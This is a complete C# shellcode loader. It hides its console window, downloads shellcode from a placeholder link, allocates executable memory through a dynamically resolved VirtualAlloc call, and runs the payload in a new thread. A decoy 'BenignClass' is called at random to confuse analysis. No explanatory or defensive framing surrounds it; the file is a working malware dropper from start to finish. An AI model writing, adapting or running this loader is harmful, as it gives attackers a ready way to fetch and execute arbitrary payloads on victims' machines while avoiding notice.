using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Reflection;

class Program
{
    static void Main(string[] args)
    {
        // Hide the console window
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // Download 
        WebClient wc = new WebClient();
        byte[] shellcode = wc.DownloadData("[DOWNLOAD_LINK]");

        // Get VirtualAlloc address and create delegate
        IntPtr kernel32 = LoadLibrary("kernel32.dll");
        IntPtr virtualAllocAddr = GetProcAddress(kernel32, "VirtualAlloc");
        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocAddr, typeof(VirtualAllocDelegate));

        // Allocate memory 
        IntPtr allocatedMemory = virtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);

        // Create thread to execute
        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);

        // Call a random method to obfuscate further
        CallRandomMethod();
    }

    static void CallRandomMethod()
    {
        MethodInfo[] methods = typeof(BenignClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
        Random rand = new Random();
        int index = rand.Next(methods.Length);
        methods[index].Invoke(null, null);
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string dllName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;

    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [Flags]
    enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    [Flags]
    enum MemoryProtection
    {
        ExecuteReadWrite = 0x40
    }
}

class BenignClass
{
    public static void Methodexecuted1()
    {
        Console.WriteLine("Method1 is executed.");
    }

    public static void Methodexecuted2()
    {
        Console.WriteLine("Method2 are executed.");
    }

    public static void Methodexecuted3()
    {
        Console.WriteLine("Method3 had executed.");
    }
}
